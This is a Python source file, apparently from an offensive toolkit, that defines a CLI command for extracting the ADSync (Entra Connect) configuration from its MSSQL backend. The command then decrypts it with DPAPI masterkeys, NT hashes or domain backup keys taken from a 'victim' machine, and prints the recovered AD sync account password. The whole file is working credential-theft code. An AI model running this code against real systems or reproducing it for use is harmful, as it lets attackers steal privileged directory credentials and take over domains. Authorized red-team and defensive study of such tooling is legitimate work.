import typer

from ._shared import sync_app, console, columns
from impacket.tds import MSSQL
from impacket.dpapi import (
    DPAPI_BLOB,
    MasterKeyFile,
    MasterKey,
    DomainKey,
    PRIVATE_KEY_BLOB,
    PVK_FILE_HDR,
    DPAPI_DOMAIN_RSA_MASTER_KEY,
    privatekeyblob_to_pkcs1,
    deriveKeysFromUserkey,
)
from Cryptodome.Cipher import PKCS1_v1_5
import re
import uuid
from base64 import b64decode
from entruder.utils import handle_cli_errors, render, OutputFormat, output_option


def _extract_xml_parameter(xml, name):
    if isinstance(xml, bytes):
        xml = xml.decode("utf-16-le", errors="ignore")
    m = re.search(
        rf'<parameter[^>]*\bname="{re.escape(name)}"[^>]*>(.*?)</parameter>',
        xml, re.DOTALL,
    )
    if not m:
        raise ValueError(f"{name} not found in configuration XML")
    return m.group(1).strip()


def _parse_private_config(private_config_xml):
    return (
        _extract_xml_parameter(private_config_xml, "forest-login-user"),
        _extract_xml_parameter(private_config_xml, "forest-login-domain"),
    )


def _parse_masterkey_file(masterkey_path):
    """Split a raw DPAPI masterkey file into its MasterKey and (optional)
    DomainKey sub-structures, mirroring impacket's examples/dpapi.py."""
    with open(masterkey_path, "rb") as f:
        data = f.read()

    mkf = MasterKeyFile(data)
    data = data[len(mkf):]

    mk = None
    if mkf["MasterKeyLen"] > 0:
        mk = MasterKey(data[:mkf["MasterKeyLen"]])
        data = data[len(mk):]

    data = data[mkf["BackupKeyLen"]:]
    data = data[mkf["CredHistLen"]:]

    dk = None
    if mkf["DomainKeyLen"] > 0:
        dk = DomainKey(data[:mkf["DomainKeyLen"]])

    return mk, dk


def _recover_masterkey(mk, dk, backup_key="", nthash="", sid=""):
    """Recover the raw DPAPI masterkey bytes, either from the user's nthash
    (+ SID) or from the domain's DPAPI backup private key."""
    if nthash:
        if mk is None:
            raise ValueError("Masterkey file has no MasterKey blob, cannot use -nthash")
        if not sid:
            raise ValueError("-sid is required alongside -nthash")
        nthash_bytes = bytes.fromhex(nthash.replace(":", ""))
        for candidate in deriveKeysFromUserkey(sid, nthash_bytes):
            decrypted = mk.decrypt(candidate)
            if decrypted is not None:
                return decrypted
        raise ValueError("Masterkey decryption failed, wrong nthash or SID")

    if dk is None:
        raise ValueError("Masterkey file has no DomainKey blob, cannot use -backupkey")
    with open(backup_key, "rb") as f:
        pvk_data = f.read()
    pvk = PRIVATE_KEY_BLOB(pvk_data[len(PVK_FILE_HDR()):])
    private_key = privatekeyblob_to_pkcs1(pvk)
    decrypted = PKCS1_v1_5.new(private_key).decrypt(dk["SecretData"][::-1], None)
    if decrypted is None:
        raise ValueError("Masterkey decryption failed, invalid domain backup key")
    domain_master_key = DPAPI_DOMAIN_RSA_MASTER_KEY(decrypted)
    return domain_master_key["buffer"][:domain_master_key["cbMasterKey"]]


def _decrypt_blob(masterkey_path, blob, entropy, backup_key="", nthash="", sid=""):
    mk, dk = _parse_masterkey_file(masterkey_path)
    key = _recover_masterkey(mk, dk, backup_key=backup_key, nthash=nthash, sid=sid)

    blob = b64decode(blob)
    if entropy:
        entropy = uuid.UUID(str(entropy)).bytes_le

    return DPAPI_BLOB(blob).decrypt(key, entropy=entropy)

@sync_app.command("extract")
@handle_cli_errors
def sync_extract(
        target: str = typer.Option("127.0.0.1", "-target", help="The IP address of the MSSQL server"),
        port: int = typer.Option(1433, "-port", help="port"),
        windows_auth: bool = typer.Option(False, "-windows-auth", help="Use Windows/NTLM authentication instead of SQL authentication"),
        username: str = typer.Option(..., "-username", help="Username of the associated user"),
        password: str = typer.Option(..., "-password", help="Password of the associated user"),
        domain: str = typer.Option(None, "-domain", help="Domain name"),
        masterkey: str = typer.Option(None, "-masterkey", help="Path to the DPAPI master key file (must be acquired extracted from the vicitm machine)"),
        backup_key:  str = typer.Option(None, "-backupkey", help="Path to the DPAPI backupkey (must be acquired extracted from the vicitm machine)"),
        nthash:  str = typer.Option(None, "-nthash", help="NT hash of the masterkey owner, used with -sid (must be acquired extracted from the vicitm machine)"),
        sid: str = typer.Option(None, "-sid", help="SID of the masterkey owner, required alongside -nthash"),
        output: OutputFormat = output_option(),
):
    """Pull the ADSync configuration (server config + AD management agent)
    off a MSSQL instance backing an Entra Connect / ADSync install."""
    if windows_auth and not domain:
        domain = '.'
    mssql = MSSQL(target, port)
    mssql.connect()
    if not mssql.login('ADsync', username, password, domain=domain, useWindowsAuth=windows_auth):
        console.print("[bold red][-][/] Login failed")
        raise typer.Exit(code=1)

    server_config = mssql.batch("SELECT keyset_id, instance_id, entropy FROM mms_server_configuration")
    if not server_config:
        console.print("[bold red][-][/] No rows returned from mms_server_configuration")
        raise typer.Exit(code=1)

    man_agent = mssql.batch("SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'")
    if not man_agent:
        console.print("[bold red][-][/] No AD management agent found in mms_management_agent")
        raise typer.Exit(code=1)

    victim_user, victim_domain = _parse_private_config(man_agent[0].get("private_configuration_xml"))
    encrypted_blob = man_agent[0].get("encrypted_configuration")
    entropy = server_config[0].get("entropy")
    row = {
        "target": target,
        "keyset_id": server_config[0].get("keyset_id"),
        "instance_id": server_config[0].get("instance_id"),
        "entropy": entropy,
        "private_configuration_xml": victim_user,
        "encrypted_configuration": encrypted_blob,
    }
    render(console, f"ADSync configuration on {target}", columns.ADSYNC_CONFIG, row,
           output=output, xml_item_tag="adsync_config")

    if masterkey and (backup_key or nthash):
        decrypted = _decrypt_blob(masterkey, encrypted_blob, entropy, backup_key=backup_key, nthash=nthash, sid=sid)
        try:
            password = _extract_xml_parameter(decrypted, "forest-login-password")
        except ValueError:
            password = decrypted.decode("utf-16-le", errors="ignore").rstrip("\x00")
        console.print(f"[bold green][+][/] Recovered password for {victim_domain}\\{victim_user}: {password}")
